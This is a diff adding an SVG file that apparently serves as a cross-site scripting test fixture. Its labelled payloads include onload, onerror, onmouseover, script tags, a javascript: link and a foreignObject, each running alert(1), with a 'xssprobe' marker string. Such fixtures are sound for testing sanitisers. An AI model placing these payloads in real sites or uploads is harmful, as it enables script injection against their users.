@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <!-- Simple marker payload -->
+  <text x="10" y="20">xssprobe1811"&gt;&lt;svg&gt;</text>
+
+  <!-- SVG onload payload -->
+  <svg onload="alert(1)" width="100" height="100">
+    <circle cx="50" cy="50" r="40" fill="red"/>
+  </svg>
+
+  <!-- Script tag payload -->
+  <script>alert(1)</script>
+
+  <!-- Img onerror payload -->
+  <img src="x" onerror="alert(1)"/>
+
+  <!-- Javascript URL payload -->
+  <a href="javascript:alert(1)">click</a>
+
+  <!-- Additional SVG-based payloads -->
+  <rect x="10" y="50" width="80" height="30" fill="blue"
+        onmouseover="alert(1)"/>
+
+  <!-- ForeignObject with HTML -->
+  <foreignObject width="100" height="50">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert(1)</script>
+      <img src="x" onerror="alert(1)"/>
+    </div>
+  </foreignObject>
+</svg>
